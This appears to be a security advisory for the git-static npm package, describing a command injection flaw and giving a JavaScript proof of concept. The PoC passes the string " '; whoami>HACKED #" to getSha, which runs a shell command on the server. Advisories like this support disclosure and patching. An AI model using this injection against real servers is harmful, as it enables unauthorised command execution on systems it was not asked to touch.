# Overview

git-static is a versioned static file server backed by Git.

Affected versions of this package are vulnerable to Command Injection. It is possible to inject arbitrary commands by using a semicolon char in any of the exported functions.
Create a bare git `repository` and set the `--repository` flag to that directory when starting the server. Code will be executed inside the `repository`.

# Proof of Concept

```javascript
var fs = require("fs");

var express = require("express"),
    optimist = require("optimist"),
    gitstatic = require("git-static");

var argv = optimist.usage("Usage: $0")
    .options("h", {
      alias: "help",
      describe: "display this help text"
    })
    .options("repository", {
      default: ".git",
      describe: "path to bare git repository"
    })
    .options("port", {
      default: 3000,
      describe: "http port"
    })
    .check(function(argv) {
      if (argv.help) throw "";
      try { var stats = fs.statSync(argv.repository); } catch (e) { throw "Error: " + e.message; }
      if (!stats.isDirectory()) throw "Error: invalid --repository directory.";
    })
    .argv;

var server = express();

server.get(/^\/.*/, gitstatic.getSha(argv.repository, " '; whoami>HACKED #", function(error){
    console.log(error);
}));

server.listen(argv.port);
```
